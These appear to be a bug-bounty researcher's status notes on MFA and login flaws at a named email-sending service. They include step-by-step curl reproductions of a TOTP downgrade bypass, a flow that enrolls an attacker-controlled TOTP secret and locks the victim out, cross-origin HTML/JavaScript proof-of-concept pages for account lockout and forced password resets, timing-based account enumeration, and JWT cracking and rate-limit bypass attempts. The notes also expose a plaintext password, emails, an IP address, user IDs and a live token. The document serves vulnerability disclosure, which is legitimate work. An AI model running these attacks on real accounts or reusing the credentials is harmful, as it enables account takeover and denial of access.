# smtp2go MFA/Auth Bypass — Test Status & Steps
**Last updated**: 2026-05-09  
**Target**: https://app.smtp2go.com/login/  
**Session time**: ~9h 26m

---

## Account State

| Account | Email | Password | TOTP | Status |
|---------|-------|----------|------|--------|
| Roy (Account A) | `0xcaphe@proton.me` | **UNKNOWN** — reset link sent | Enabled | ⚠️ Password unknown, reset link in proton.me inbox |
| Ted (Account B) | `0xcaphe+ted@wearehackerone.com` | `V75m1XkJ4JcwbXq#5vFm` | Disabled | Untested (IP blocked) |

**Note**: Roy's email was changed from `0xcaphe+roy@wearehackerone.com` → `0xcaphe@proton.me` via team API during session. Confirmed via forgot-password oracle (3.2s response = email registered).

---

## Current Blockers

1. **IP rate limit on `/api/login/`** — all logins from IP `142.59.70.219` return `{"error":"login-required"}` with ~3s artificial delay. Active for 9h+. Blocks all testing.
2. **Roy's password unknown** — `update_member` call may have changed it. Password reset link sent to `0xcaphe@proton.me`.

### To Unblock
1. Access proton.me → click smtp2go reset link → set new known password (e.g. `TestBypass2026!`)
2. Test login from **different IP** (phone on mobile data, NOT same WiFi as 142.59.70.219)

---

## Findings Summary

| ID | Finding | Severity | CVSS | Report | Status |
|----|---------|----------|------|--------|--------|
| MFA-001 | TOTP downgrade via `use_auth=email` | **High** | 7.5 | `report_MFA001.md` | 95% — needs final OTP step |
| MFA-002 | No CSRF on `/login/2fa/` | Low | 3.7 | `report_MFA002.md` | ✅ Confirmed |
| MFA-003 | Account enumeration via `/forgot-password/` | Low | 3.7 | `report_MFA003.md` | ✅ Confirmed |
| MFA-004 | No CSRF on `/forgot-password/` | Medium | 5.4 | `report_MFA004.md` | ✅ Confirmed |
| MFA-005 | Fixed lockout, no exponential backoff | Low | 2.6 | `report_MFA005.md` | ✅ Confirmed |
| MFA-006 | `login_id` cookie missing `Secure` flag | Low | 3.1 | `report_MFA006.md` | ✅ Confirmed |
| MFA-007 | Device trust JWT HS256 (info only) | Info | — | — | ❌ Secret uncrackable |
| MFA-008 | 2FA enable validates client-sent TOTP secret | Medium | 5.4 | `report_MFA008.md` | ✅ Confirmed |

---

## MFA-001 — Complete Reproduction Steps

**Vulnerability**: Sending `use_auth=email` on `/login/2fa/` switches from TOTP to email OTP, bypassing authenticator app entirely.

### Step 1 — Login (get session + login_id)
```bash
curl -s -c /tmp/cookies.txt \
  -X POST 'https://app.smtp2go.com/api/login/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: https://app.smtp2go.com' \
  -d 'username=0xcaphe%40proton.me&password=CURRENT_PASSWORD'
# Response: {"status":"OK","results":{"goto":"https://app-us.smtp2go.com/dashboard/main/?login_id=XXXX"}}
```

### Step 2 — Follow goto URL (reach 2FA page)
```bash
GOTO="https://app-us.smtp2go.com/dashboard/main/?login_id=XXXX"
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -L "$GOTO" -o /tmp/2fa.html
# 2FA page will have: <input name="use_auth" value="app">
# Extract login_id value from page/URL
```

### Step 3 — Trigger MFA downgrade (send use_auth=email)
```bash
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST 'https://app-us.smtp2go.com/login/2fa/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'authentication_code=' \
  --data-urlencode 'requested_endpoint=myaccount_dashboard_main' \
  --data-urlencode 'requested_args={"login_id": "LOGIN_ID_HERE"}' \
  --data-urlencode 'use_auth=email'
# Response: HTML page with "Enter the verification code sent to [email]"
# Email OTP sent to 0xcaphe@proton.me
```

### Step 4 — Submit OTP from proton.me inbox
```bash
OTP="XXXXXX"  # 6-digit code from email
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST 'https://app-us.smtp2go.com/login/2fa/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "authentication_code=$OTP" \
  --data-urlencode 'requested_endpoint=myaccount_dashboard_main' \
  --data-urlencode 'requested_args={"login_id": "LOGIN_ID_HERE"}' \
  --data-urlencode 'use_auth=email'
# Expected: HTTP 302 → /dashboard/main/ — full authenticated session, TOTP bypassed
```

---

## MFA-008 — Complete Reproduction Steps

**Vulnerability**: `verify_app_2fa` in enable mode validates TOTP against client-sent `totp_secret_key`, not server-stored secret. Attacker can enroll TOTP with attacker-controlled secret on any TOTP-less account.

### Prerequisites
- Valid authenticated session (no TOTP on account)
- `CSRF_key` from `/account/2fa/` page (visible in XHR calls in DevTools)

### Step 1 — Get proposed secret (any value, will be overridden)
```bash
curl -s -b cookies.txt \
  "https://app-us.smtp2go.com/api/settings/two_factor_auth/?action=verify_auth&CSRF_key=CSRF_KEY_HERE" \
  -X POST -H 'Content-Type: application/json' \
  -d '{"password":"ACCOUNT_PASSWORD"}'
# Response includes totp_secret_key (server-generated, but we ignore it)
```

### Step 2 — Generate attacker TOTP secret
```python
import pyotp
attacker_secret = pyotp.random_base32()
totp = pyotp.TOTP(attacker_secret)
current_code = totp.now()
print(f"Secret: {attacker_secret}")
print(f"Code: {current_code}")
```

### Step 3 — Enroll attacker secret
```bash
curl -s -b cookies.txt \
  "https://app-us.smtp2go.com/api/settings/two_factor_auth/?action=verify_app_2fa&CSRF_key=CSRF_KEY_HERE" \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"totp_secret_key\":\"ATTACKER_SECRET\",\"auth_to_disable\":\"\",\"otp_code\":\"$current_code\"}"
# Response: {"status":"ok"} — TOTP now active with attacker's secret
# Victim cannot log in — only attacker knows valid codes
```

---

## MFA-002 — Lockout via Cross-Origin OTP Guessing

**Vulnerability**: `/login/2fa/` accepts POSTs from any origin — no CSRF, no Origin check.

```bash
# Confirm cross-origin accepted:
curl -s -X POST 'https://app.smtp2go.com/login/2fa/' \
  -H 'Origin: https://evil.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'otp=000000'
# Response: 200 OK (not blocked)
```

PoC page to lock victim out:
```html
<script>
async function lockout() {
  for (let i = 0; i < 6; i++) {
    await fetch('https://app.smtp2go.com/login/2fa/', {
      method: 'POST', credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'otp=000000'
    });
  }
}
lockout();
</script>
```

---

## MFA-003 — Account Enumeration via Forgot Password

```bash
# Valid account — slow (~2-13s) + "Password reset email sent to [email]"
time curl -s -X POST 'https://app.smtp2go.com/forgot-password/' \
  -d 'email=valid@example.com'

# Invalid email — fast (~380ms) + "Unable to retrieve user information..."
time curl -s -X POST 'https://app.smtp2go.com/forgot-password/' \
  -d 'email=notexists@example.com'
```

---

## MFA-004 — CSRF on Forgot Password

```bash
# Cross-origin POST triggers real password reset:
curl -s -X POST 'https://app.smtp2go.com/forgot-password/' \
  -H 'Origin: https://evil.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=victim%40example.com'
# 200 OK — reset email sent, no CSRF validation
```

PoC:
```html
<form action="https://app.smtp2go.com/forgot-password/" method="POST" id="f">
  <input name="email" value="victim@example.com">
</form>
<script>document.getElementById('f').submit();</script>
```

---

## MFA-006 — Missing Secure Flag on login_id Cookie

```bash
curl -si -X POST 'https://app.smtp2go.com/api/login/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=test&password=test' | grep -i 'set-cookie'
# Set-Cookie: login_id=<value>; HttpOnly; Path=/
# Missing: Secure, SameSite
```

---

## JWT Crack Attempt (MFA-007)

Device trust JWT from April 2026 session:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHRlcm5hbF9pZCI6IjEwMTAzOTUiLCJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQ3LjAuMC4wIFNhZmFyaS81MzcuMzYiLCJyZW1vdGUtYWRkciI6Ijc1LjE1OS4xMjguMTc4IiwiaWF0IjoxNzc2NDA0MTYzLCJleHAiOjE3NzY0NDczNjN9.Y6Zm4JbHma_KiVeN4LPz7bx-cR4Y_BoMTtSGsvZXwjY
```

Tried: rockyou.txt (14M), targeted smtp2go wordlist (125), brute force 1-6 chars → **all failed**. Secret is properly random.

Cookie name = `1XJgM5twoV0e8IhkwW0BQuDwzkz` (base64url of SHA1-like hash of user_id `1010395`).

---

## Next Steps (Priority Order)

1. **Access proton.me** → click reset link → set known password
2. **From different IP** → log in as Roy → run MFA-001 end-to-end (Steps 1-4 above)
3. **Get Ted session** (no TOTP) → test template IDOR (Account B reads template `1250783`)
4. **Submit reports** to HackerOne in order: MFA-001 → MFA-008 → MFA-004 → MFA-002/003/005/006

---

## Key Technical Details

- Login endpoint: `POST https://app.smtp2go.com/api/login/`
- 2FA endpoint: `POST https://app-us.smtp2go.com/login/2fa/`
- 2FA settings API: `POST https://app-us.smtp2go.com/api/settings/two_factor_auth/?action=X&CSRF_key=Y`
- Roy user_id: `1010395` | Roy domain_id: `118702`
- Ted user_id: `1015003`
- Rate limit: IP-based, ~3s delay, 9h+ duration on IP `142.59.70.219`
- Rate limit bypass attempts: XFF/X-Real-IP/CF-Connecting-IP — all blocked
